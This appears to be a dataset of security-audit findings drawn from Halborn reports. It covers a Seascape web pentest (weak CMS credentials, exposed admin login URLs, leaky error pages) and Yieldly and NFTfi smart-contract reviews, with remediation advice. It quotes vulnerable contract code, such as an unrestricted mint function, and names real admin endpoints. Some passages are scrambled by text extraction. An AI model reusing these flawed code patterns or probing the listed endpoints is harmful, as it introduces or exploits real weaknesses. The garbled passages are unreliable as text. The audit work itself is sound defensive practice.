easy-to-guess username and The username was the same as the application password combination. name, as well as the password being trivial to guess. Additionally, the same credentials allowed to access both the testing and the production environments. After logging in, users were presented with different interfaces that allowed to modify the content displayed to the users, as well as collecting sensitive information about the backend infrastructure. For instance, users with access to the CMS could edit pages content, insert their own malicious links, send phishing emails to Seascape newsletter contacts, add and modify mini-games details. It should be noted that the full criticality of this issue was not assessed by Halborn, as Seascape promptly amended the CMS credentials to prevent any unauthorized access to the platform. Code Location: The following screenshots show some of the functionality which could be exploited by a malicious user with access to the CMS backend. Below is presented the sensitive information that was disclosed about the servers technology stack in use: 14 The following functionality could be abused to send phishing emails that would come from Seascapes official domain. Thus, users would be more likely to fall victim to the attack: The edit page functionality could be used to deface the applications front end as well as insert malicious code such as JavaScript (which could trigger Cross-Site Scripting (XSS) vulnerabilities) and malicious links. 15 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Whilst the issue was remediated by Seascape during the assessment window, the following recommendations for secure password generation should be taken into consideration. A strong password policy can significantly reduce the risk of an attacker being able to gain access through a password guessing attack. A strong password should be at least 16 characters in length. Complex- ity requirements (i.e., upper and lowercase letters, numbers and special characters) will also increase a passwords strength, but these require- ments can make it more difficult for people to set and remember passwords, and do not contribute as much to password strength as pure length. Longer passwords without complex character requirements are considered both eas- ier for humans to remember and more difficult to guess or brute-force via automated means. Therefore, it is recommended that, to reduce the burden on users memories, complexity requirements are removed from the policy in tandem with the increase in minimum length. To accommodate the increased length requirement, users should be encour- aged to consider their passwords to be passphrases rather than single words. A phrase such as todayiwillworkverywellindeed is easier to remem- ber and significantly less likely to be guessed through standard password guessing techniques than a short but complex password such as Pa$$w0rd1. As administrative accounts are commonly targeted by attackers, it is recommended that these accounts are further secured by requiring a higher minimum number of characters, such as 20. As an additional measure, it is advised to add commonly used passwords to a blacklist, which would significantly increase the resilience of user accounts to password guessing attacks. Users should not be able to 16 choose passwords containing words that appear in the blacklist, which should contain the following:  The username  The company name  The application name  Months and seasons  Commonly used weak passwords (password, secret, etc.) Remediation Plan: SOLVED: The Seascape team amended the password to be more secure. 17 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Critical"]}, {"title": "ADMIN PANEL PUBLICLY EXPOSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "Testing revealed that the application exposed different login pages to the users. One of them was the CMS admin panel. It should be noted that one of the login pages allowed users to register an account. Seascape explained that users who log in with this interface would only be allowed to access extra content should an admin authorized them to do so. Code Location: The following three URLs allowed access to the aforementioned login pages:  https://beta-bsc.seascape.network/admin/Login/index.html  https://beta-bsc.seascape.network/index/user/login  https://beta-bsc.seascape.network/index/login/login Risk Level: Likelihood - 3 Impact - 3 Recommendation: Where possible, admin panels should only be accessible to the required users, for instance by implementing IP address whitelisting. Addition- ally, it is recommended to remove any unused functionality that might be used for testing, as this opens up unnecessary attack surface. Finally, strong password policy requirements should be followed to ensure that any unauthorized user cannot access sensitive content. Please refer to the Weak CMS Password recommendations above. 18 Remediation Plan: PARTIALLY SOLVED: The Seascape team acknowledged the issue and informed that they have implemented IP address whitelisting only on the authenti- cated part of the application, but not on the panel itself. 19 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Medium"]}, {"title": "SENSITIVE INFORMATION DISCLOSURE VIA VERBOSE ERROR MESSAGES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "Within the testing environment, it was identified that by accessing nonexistent pages, a stack trace would be presented to the user. Within the content of the server response, sensitive information was identified, such as database hostname, username, and password. While the database host was inaccessible, these credentials might be used on other environments, and their disclosure increased Seascapes attack surface. Code Location: It was possible to generate a stack trace by accessing unavailable content such as the following page: https://beta-bsc.seascape.network/admin/reset The extract from the server response is presented below: Listing 1 America / New_York [ Redacted ] 1 TIMEZONE 2 HOSTNAME 3 ethplatform CWS - ETH 4 bsc PancakeSwap 5 bscplatform pCWS - BNB 6 api https :// beta - api . seascape . network / 7 nftAddress 8 burning 0 x3Cd60dEc3F8623B61537A8A681850c776709Ac5A 9 PASSWORD 10 crownsAddress 11 USERNAME 12 PHP_MEMORY_LIMIT 13 PATH beta_seascape [ Redacted ] 512 M 0 x7115ABcCa5f0702E177f172C1c14b3F686d6A63a 0 x168840Df293413A930d3D40baB6e1Cd8F406719D / usr / local / sbin :/ usr / local / bin :/ usr / sbin :/ usr / bin :/ sbin :/ bin 20 14 default_lang 15 DATABASE 16 PWD / data / code 17 domain beta en - us beta_eth_seascape Risk Level: Likelihood - 3 Impact - 3 Recommendation: Halborn recommends that the testing environment is either made accessible only to whitelisted IP addresses or that the debug feature is disabled. Additionally, Seascape should ensure that the identified password is not used elsewhere in their infrastructure, to prevent attackers from accessing unauthorized content. Remediation Plan: PARTIALLY SOLVED: The issue is not present on the production environment however users would be able to recover the sensitive information via the messages disclosed in the testing environment. It should be noted that the production environment is a replica of the testing one therefore the information would still be of use. 21 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Medium"]}, {"title": "OUTDATED THINKPHP VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "By observing the server response on nonexistent pages, it was possible to identify the exact ThinkPHP version number. The version in use by Seascape was version 6.0.5, which is outdated. At the time of writing this report, the most recent version is 6.0.11. One critical vulnerability was identified in ThinkPHP version 6.0.8. However, it was not confirmed if this applied to the version in use by Seascape. By using an outdated software version, Seascape might not benefit from features and security enhancements available on the new version of this framework. Code Location: The following screenshot shows the framework version being disclosed on the production environment: Risk Level: Likelihood - 3 Impact - 3 22 Recommendation: Halborn recommends that a patch management policy is implemented to ensure that all software components are updated to the latest stable and secure versions at all times. This would minimize the window of opportunity that an attacker would have to exploit any vulnerabilities affecting these components. For ThinkPHP, the latest stable version is version 6.0.11 - available at ThinkPHP GitHub. Remediation Plan: RISK ACCEPTED: The development team weighted the risk and time resources required to upgrade the version and are happy to continue using the current one. 23 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Medium"]}, {"title": "USE OF PACKAGES WITH KNOWN VULNERABILITIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "The application uses third-party dependencies to delegate handling of different kind of operations, e.g., generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. However, the dependencies bring forth an expected downside where the security posture of the real application is now resting on them. Several imported packages were found to not be updated to the latest version and presented various security risks, as described below. Vulnerabilities List: Title Denial of Service (DoS) Prototype Pollution Denial of Service (DoS) Command Injection DoS Arbitrary File Creation Prototype Pollution Package global-parent ini is-svg lodash ssri tar y18n Severity HIGH HIGH HIGH HIGH HIGH HIGH HIGH Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is highly recommended performing automated analysis of the dependencies from the birth of the project and if they happen to contain any security issues. The Seascape team needs to be aware of it and apply the required mitigation measures to secure the affected application. 24 Remediation Plan: SOLVED: The Seascape team performed an update of the dependencies in use. 25 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Medium"]}, {"title": "MISSING HTTP SECURITY HEADERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "The assessment revealed several security headers were not enforced by the application. These headers are used by client browsers to ensure various security controls are appropriately implemented during the normal functioning of the application.  X-Content-Type-Options, which indicates that the MIME types adver- tised in the Content-Type headers should not be changed and be followed.  X-Frame-Options, which indicates whether a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>.  Content-Security-Policy, which allows website administrators to con- trol resources the user agent is allowed to load for a given page.  Strict-Transport-Security (HSTS) - which enforces secure transmis- sion by letting a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP.  Referrer-Policy - specifies what information, or parts of it, should be sent in the Referer header with the request that prompted the redirection.  Cache-Control - instructs the browser: should be stored in the temporary memory. if, how and which items  Pragma - using the no-cache directive forces the browser to query the server before downloading a cached copy of the page, resulting in the download of the most recent version.  Expires - includes a date, period, or value indicating when the servers response is no longer correct. It should be noted that in some situations Strict-Transport-Security and X-Content-Type-Options (and in some cases X-Frame-Options) do not neces- sarily have to be enabled by the application directly. These headers can be injected by supporting load balancers or web application accelerators. 26 Recommendation: Seascape should review the above security headers and ensure that where appropriate these headers are included within all exposed endpoints and services. This allows Seascape to ensure the defence-in-depth approach is achieved thought the application. References: Strict-Transport-Security X-Content-Type-Options X-Frame-Options Content-Type Remediation Plan: RISK ACCEPTED: The development team informed that they will look into enabling the recommended headers. 27 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Low"]}, {"title": "SESSION COOKIE WITHOUT SECURE AND HTTPONLY FLAGS SET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "After logging to the CMS, the application server set a PHP cookie. Cookies are used by web applications to store information relating to the site within the users browser. In particular, cookies typically contain session information that ties individual requests to the application with a specific user. The following observations were made on the applications session cookie. The HttpOnly flag was not set for the cookie used by the application, which could allow an attacker to impersonate users by stealing their sessions, should cross-site scripting vulnerabilities be discovered in the application in the future, potentially allowing them to impersonate the applications users. Additionally, without the secure flag, the cookies contents could potentially traverse a clear text channel, which could result in an attacker gaining access to a users session information. The Secure flag is an attribute of cookies that instructs a browser whether a cookie can be transmitted over a clear text channel, such as HTTP. Cookies that are sent over a clear text channel can be intercepted by an attacker that is suitably positioned on the network. Once intercepted, the cookies content can be read or altered to suit the attackers needs. If the Secure flag is set, the browser will only send the cookie over an HTTPS connection. Due to the encrypted nature of HTTPS, similar attacks would no longer be possible. The application only communicated over an encrypted HTTPS channel. There- fore, it was not possible for an attacker to create a condition in which However, the cookie would be transmitted over a clear text channel. security best practice dictates that cookies containing session tracking information should be protected with the Secure flag. 28 Code Location: The Secure and HttpOnly flags are stipulated in the Set-Cookie header, as the value is assigned. As can be seen in the extract below, this flag was not present. Listing 2 1 HTTP /1.1 200 OK 2 Date : Fri , 07 Jan 2022 15:26:34 GMT 3 Content - Type : application / json ; charset = utf -8 4 Connection : close 5 Cf - Railgun : c4a0eb76c8 stream 0.000000 0210 57 da 6 Set - Cookie : think_lang = en - us ; path =/; domain = seascape . network 7 Set - Cookie : PHPSESSID =[ Redacted ]; path =/; domain = seascape . network 8 X - Powered - By : PHP /7.3.31 9 CF - Cache - Status : DYNAMIC 10 Expect - CT : max - age =604800 , report - uri =\" https :// report - uri . cloudflare . com / cdn - cgi / beacon / expect - ct \" 11 Server : cloudflare 12 CF - RAY : 6 c9e3485db8b71d8 - LHR 13 alt - svc : h3 =\":443\"; ma =86400 , h3 -29=\":443\"; ma =86400 , h3 -28=\":443\"; ma =86400 , h3 -27=\":443\"; ma =86400 14 Content - Length : 9630 Risk Level: Likelihood - 2 Impact - 2 Recommendation: The Secure flag and the HttpOnly flag should be set on all cookies containing sensitive data such as user session tokens. Once enabled, these flags will be visible in the web servers Set-Cookie headers. The source code of the application can either be amended, or the config- uration changes can be applied to the hosting server and/or the reverse proxy. The directives would depend on the server in use. 29 Remediation Plan: RISK ACCEPTED: The Seascape team confirmed that they will amend the server side configuration to add the HttpOnly and secure flag to cookies. 30 ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Low"]}, {"title": "TLS MISCONFIGURATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "TLS MISCONFIGURATIONS", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Low"]}, {"title": "FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf", "body": "Testing revealed that the application fronted did not display correctly formatted content when opening the Zombie minigame. Whilst this does not pose a direct security risk, it could lead an attacker to believe that the component is vulnerable to HTML injection or cross-site scripting (XSS) and expose the application to more targeted attacks. Code Location: The following screenshot displays the frontend error: 34 35 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the frontend is reviewed to ensure that all components work as expected and display the correct data. Remediation Plan: SOLVED: This issue only appeared in the testing environment and was fixed. 36 3.10 (HAL-10) HARDCODED AND WEAK CREDENTIALS - INFORMATIONAL ", "labels": ["Halborn", "Seascape_Minigames_Web_Pentest", "Severity: Informational"]}, {"title": "UNRESTRICTED TOKEN MINTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Yieldly.sol, The owner can call mintAll function for the token minting. However, the mint function does not have any access control modifier. An attacker can mint any tokenId via the public function. Code Location: Listing 1: Yieldly.sol (Lines 14) 14 15 16 17 18 19 20 21 22 function mint ( uint256 _id , address _to , string memory ) public { _tokenURI _safeMint ( _to , _id ); _setTokenURI ( _id , _tokenURI ); } Risk Level: Likelihood - 4 Impact - 4 Recommendation: Consider to make function private. The function should be called from the users and the contract should eliminate centralization risks. Remediation plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 19 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: High"]}, {"title": "BID TIME CONFUSION ON THE AUCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Marketplace.sol, When creating bid for the auction, the contract does not set the bid date. The code section is commented out the relative set statement. On the other hand, firstBidTime is set when the auction created. Therefore, It doesnt show the correct timestamp. Code Location: Listing 2: Marketplace.sol (Lines 404) 402 403 404 405 406 407 408 409 410 411 if ( auctions [ tokenId ]. amount == 0) { // If so , it is the first bid . // auctions [ tokenId ]. firstBidTime = block . timestamp ; // We only need to check if the bid matches reserve bid for the first bid , // since future checks will need to be higher than any previous bid . require ( amount >= auctions [ tokenId ]. reservePrice , \" Must bid reservePrice or more \" ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Ensure that firstBidTime is set on the bid creation if it is not an intended behaviour. 20 Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 21 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "CENTRALIZATION RISK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Marketplace smart contract, the admin has the authority over the NFT token transfer. Any compromise to the privileged account which has access to onlyAdminRecovery may allow the attacker to take advantage. Code Location: Listing 3: Marketplace.sol (Lines 556) 556 557 558 559 560 561 562 563 564 565 function recoverNFT ( uint256 tokenId ) external onlyAdminRecovery { Yieldly ( nftContract ). transferFrom ( // From the auction contract . address ( this ) , // To the recovery account . adminRecoveryAddress , // For the specified token . tokenId ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider to carefully manage the privileged accounts private key to avoid any potential risks of being hacked. In the general, we are recommending centralized privileges or roles in the protocol to be improved via a decentralized mechanism or smart-contract based accounts with the enhanced 22 security practices, e.g, Multisignature wallets. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 23 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "LACK OF START DATE CHECK ON THE AUCTION CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the dynamic testing, It has been seen that start_Date variable is not checked. When the new auction is created, Start-Date should be equal or more than the Latest Timestamp. Code Location: Listing 4: Start Date Has Not Been Checked 1 2 3 4 5 6 function createAuction ( uint256 tokenId , uint256 startDate , uint256 duration , uint256 reservePrice ) public nonReentrant whenNotPaused auctionNonExistant ( tokenId ) {} Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider to check start date is more than the latest timestamp. Listing 5 1 require ( startDate >= block . timestamp , \" Can ' t create past auction !\") ; 24 Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 25 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contracts, nftContract, WMATICAddress and adminRecoveryAddress are missing address validation in their constructors. Every address should be validated and checked that is different from zero. Code Location: Listing 6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 constructor ( address nftContract_ , address WMATICAddress_ , address adminRecoveryAddress_ ) { require ( IERC165 ( nftContract_ ). supportsInterface ( ERC721_INTERFACE_ID ) , \" Contract at nftContract_ address does not support NFT interface \" ); // Initialize immutable memory . nftContract = nftContract_ ; WMATICAddress = WMATICAddress_ ; adminRecoveryAddress = adminRecoveryAddress_ ; // Initialize mutable memory . _paused = false ; _adminRecoveryEnabled = true ; } Risk Level: Likelihood - 2 Impact - 2 26 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 27 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "LACK OF PAUSE MODIFIER ON THE MINT FUNCTIONALITY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Marketplace.sol contract, during the contract is paused, the mint functionality is not paused. Code Location: Listing 7 1 function mint ( string memory _tokenURI , uint256 _price , bool _isListOnMarketplace , uint256 _royalty , uint256 startDate , uint256 auctionLength ) public Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider review pause/unpause functionalities and activate them on the related functions. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 28 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "TOKEN IS BUYABLE WHEN THE AUCTION IS ACTIVE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Marketplace.sol contract, when the auction is active for the token, the token is still buyable. It depends on the behavior, the auction should be cancelled after the token bought by another owner. Code Location: Listing 8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function buy ( uint _id , uint256 _price ) external payable { _validate ( _id ); require ( price [ _id ]== _price , \" Error , price is not match \" ); address _previousOwner = ownerMap [ _id ]; address _newOwner = msg . sender ; // 2.5% commission cut uint256 _commissionValue = price [ _id ]. mul (25) . div (1000) ; uint256 _royaltyValue = price [ _id ]. mul ( royaltyMap [ _id ]) . div (100) ; uint256 _sellerValue = price [ _id ]. sub ( _commissionValue + _royaltyValue ); // _owner . transfer ( _owner , _sellerValue ) ; transferMATICOrWMATIC ( payable ( _previousOwner ) , _sellerValue ); transferMATICOrWMATIC ( payable ( creatorMap [ _id ]) , _royaltyValue ); transferMATICOrWMATIC ( payable ( adminRecoveryAddress ) , _commissionValue ); Yieldly ( nftContract ). transferFrom ( address ( this ) , _newOwner , _id ); ownerMap [ _id ] = msg . sender ; listedMap [ _id ] = false ; emit Purchase ( _previousOwner , _newOwner , price [ _id ], _id ); } 29 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that the behavior is intended, If It is not, cancel the current auction for the token id. Remediation Plan: RISK ACCEPTED: The Yieldly.Finance team accepted the risk for this find- ing. 30 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform privileged actions Two of the contracts are such as withdraw, mintBatch, addCreatorMap. inherited from Ownable contract. In the Marketplace.sol and Yieldly.sol, smart contract, the renounceOwnership function is used to renounce being If an owner is mistakenly renounced, administrative access an owner. would result in the contract having no Owner, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As another solution, Renounce Ownership functionality can be disabled with the following line of codes. Listing 9: Disable Renounce Ownership (Lines 2) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } 31 Remediation Plan: RISK ACCEPTED: The Yieldly.Finance team accepted the risk for this find- ing. 32 ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Low"]}, {"title": "MISFUNCTIONAL TOKEN OWNER SET ON THE AUCTION CREATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the Marketplace.sol, The owner of tokenId can create an auction. However, on the Line #359, the owner of the token is set to msg.sender. The check can cause serious problems in the contract, but transferFrom function is protecting the contract from a risk. Code Location: Listing 10: Marketplace.sol (Lines 359) 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 function createAuction ( uint256 tokenId , uint256 startDate , uint256 duration , uint256 reservePrice ) public nonReentrant whenNotPaused auctionNonExistant ( tokenId ) { // Check basic input requirements are reasonable . require ( msg . sender != address (0) ) ; // Initialize the auction details , including null values . // if ( _isNew ) { // // // // // // _tokenIds . increment () ; uint256 newTokenId = _tokenIds . current () ; tokenId = newTokenId ; price [ tokenId ] = reservePrice ; creatorMap [ tokenId ] = Creator ; Yieldly ( nftContract ) . mint ( tokenId , msg . sender , _tokenUri ) ; // } ownerMap [ tokenId ] = msg . sender ; openTrade ( tokenId , reservePrice ); } 33 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider deleting the following code statement. Listing 11 1 ownerMap [ tokenId ] = msg . sender ; Remediation Plan: ACKNOWLEDGED: The Yieldly.Finance team acknowledged this finding. 34 3.10 (HAL-10) USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS - INFORMATIONAL ", "labels": ["Halborn", "Yieldly_Finance_Polygon_NFT_MarketPlace", "Severity: Informational"]}, {"title": "CAUSE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Ethereum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _payBackLoan under DirectLoanBaseMinimal does not pre-check the users balance by being payoffAmount + adminFee + revenueShare it does so in- crementally. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It would be nice if the code cloud pre-check if the user had enough balance for all transfers combined instead of checking and transferring incrementally. It is recommended to always check pre/post balances after a transfer. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 13 MANUAL ANALYSIS 14 The functionDelegateCall is used on:  airdrop/AirdropFlashLoan.sol  airdrop/AirdropReceiver.sol  loans/direct/loanTypes/LoanAirdropUtils.sol _transferNFT makes a delegate call on the _nftTransferWrapper and _nftWrapper contexts, calling the transferNFT function. This means that all wrappers registered in PermittedNFTsAndTypeRegistry should not register any storage variable; otherwise, storage layout issues and collision could occur. all contracts present in nftTypeRegistry do not hold any storage variable, which makes them compatible with the delegate calling system. Currently,  loans/direct/loanTypes/DirectLoanBaseMinimal.sol _transferNFT does delegate to the nftCollateralWrapper loan in the con- text of the contract that implements DirectLoanBaseMinimal. At this time, there is only one contract that extends DirectLoanBaseMinimal which cor- responds to the DirectLoanFixedOffer contract. The DirectLoanFixedOffer contract does not add new storage variables, but will get all the variables present in DirectLoanBaseMinimal which extends BaseLoan, NftReceiver and LoanData. Taking this into account, storage collision could be pos- sible between nftCollateralWrapper and DirectLoanBaseMinimal contract. Although the mappings will be used in the nftCollateralWrappers code, it is still possible that some mapping may collide. When transferring the mapping used in the NFT code are the following: Listing 1 1 2 mapping ( address => uint256 ) private _balances ; mapping ( uint256 => address ) private _tokenApprovals ; The functionCall is used on:  airdrop/AirdropFlashLoan.sol 15 S I S Y L A N A L A U N A M  airdrop/AirdropReceiver.sol Both contracts use a call to a user-specified target with any call data. However, both calldata and target are checked against IPermittedAirdrops for validity, and only allow anything other than the one approved by the owners via setAirdroptPermit or setAirdroptPermits. 4.1 NftfiHub This contract is a central point for all the contracts registered in the NFTfi system. When a contract needs the address of another contract, it will refer to the hub with a key and the hub will be providing the corresponding address.  All critical functions like setContract, setContracts are being checked for ownership  A contract key that does not exist will return a zero address. 4.2 DirectLoanCoordinator It will have the LOAN_COORDINATOR_ROLE role in the SmartNFT contract  What if the user burns obligationReceiptToken NFTs before the loan period ends?  It is not possible to burn tokens, only resolveLoan does it. promissoryNoteToken the and 4.3 PermittedAirdrop  Properly manage the ownership  Critical functions such as setAirdroptPermit and setAirdroptPermits are guarded. 16 S I S Y L A N A L A U N A M 4.4 PermittedNFTsAndTypeRegistry It is used to register a valid NFT in the NFTfi system. The contract will be used to access NFT wrappers and register new NFT types and permits.  Critical functions are protected by the owner  A critical function is protected by using onlyOwnerOrAirdropFactory instead of onlyOwner. Backtracking the ownership relationship does verify that the check is safe. AirdropFactory is cloning new airdrops templates. However, those templates will not have permissions on the PermittedNFTsAndTypeRegistry contract. 4.5 nftTypeRegistry/nftTypes They are registered under the PermittedNFTsAndTypeRegistry contract and used with the AirdropReceiver contract to wrap the underlying NFT assets. All registered wrappers should not contain any storage variable. They are used by performing a delegatecall to the underlying wrapped contract and do not require new storage variables; otherwise, a variable collision could occur. Currently, all contracts present in nftTypeRegistry do not hold any new storage variables, which makes them compatible with the delegate calling system. 4.6 SmartNFT All operations are restricted to the LOAN_COORDINATOR_ROLE which is ex- pected to be for the DirectLoanCoordinator contract only. However, the transfer is allowed to anyone. As an example, the obligation token can be transferred to the lender: 17 S I S Y L A N A L A U N A M S I S Y L A N A L A U N A M 18 CALL GRAPH AND INHERITANCE 19 AirdropFlashLoan: E C N A T I R E H N I D N A H P A R G L L A C Figure 1: airdrop/AirdropFlashLoan.sol 20 AirdropFlashLoan_target_nftWrapperLegendINftfiHubReentrancyGuard<Constructor>INftfiHubpullAirdrop_transferNFT_getSelectorIPermittedAirdropsIERC1155IERC721functionCallgetContractsupportsInterfacetypesupportsInterfaceINftWrapperfunctionDelegateCallInternal CallExternal CallDefined ContractUndefined Contract AirdropReceiver: E C N A T I R E H N I D N A H P A R G L L A C Figure 2: airdrop/AirdropReceiver.sol 21 AirdropReceiver_nftTransferWrapperIERC1155ReentrancyGuardLegendIERC721IERC20_targetINftfiHubonlyOwnergetTokenIdownerOfonlyOwnerOrBeneficiary<Constructor>INftfiHub_safeMintinitializewrap_transferNFTIPermittedNFTsgetContractunwrappullAirdrop_getSelectorIPermittedAirdropsfunctionCallsupportsInterfacetypesupportsInterfacedrainERC20AirdropIERC20balanceOfsafeTransferdrainERC721AirdropIERC721safeTransferFromdrainERC1155AirdropIERC1155balanceOfsafeTransferFromINftWrapperfunctionDelegateCallonERC721Received_receiveAndWraponERC1155ReceivedonERC1155BatchReceivedInternal CallExternal CallDefined ContractUndefined Contract DirectLoanBaseMinimal: E C N A T I R E H N I D N A H P A R G L L A C Figure 3: loans/direct/loanTypes/DirectLoanBaseMinimal.sol 22 DirectLoanBaseMinimalIERC1155IERC721INftfiHubIERC20LegendIDirectLoanCoordinatorLoanChecksAndCalculationsAddressLoanAirdropUtilsNFTfiSigningUtils<Constructor>_setERC20PermitINftfiHubupdateMaximumLoanDurationtypeupdateAdminFeedrainERC20AirdropIERC20balanceOfsafeTransfersetERC20PermitsetERC20PermitsdrainERC721AirdropIERC721ownerOfsafeTransferFromdrainERC1155AirdropIERC1155balanceOfsafeTransferFrommintObligationReceiptIDirectLoanCoordinatorgetContractmintObligationReceiptrenegotiateLoan_renegotiateLoanpayBackLoan_payBackLoan_resolveLoan_getPartiesAndDatapayBackChecksliquidateOverdueLoancheckLoanIdValiditypullAirdroppullAirdropwrapCollateralwrapCollateralcancelLoanCommitmentBeforeLoanHasBegungetPayoffAmountgetWhetherNonceHasBeenUsedForUsergetERC20PermitSignatureownerrenegotiationCheckscomputeAdminFeeisValidLenderRenegotiationSignature_createLoan_createLoanNoNftTransfer_transferNFTregisterLoancomputeReferralFeeINftWrapperfunctionDelegateCall_payoffAndFeecomputeRevenueShare_resolveLoanNoNftTransferresolveLoan_loanSanityChecksgetLoanDataobligationReceiptTokenpromissoryNoteToken_setupLoanExtrasLoanExtrasgetRevenueSharePercent_getWrapperIPermittedNFTsInternal CallExternal CallDefined ContractUndefined Contract DirectLoanFixedOffer: E C N A T I R E H N I D N A H P A R G L L A C Figure 4: loans/direct/loanTypes/DirectLoanFixedOffer.sol 23 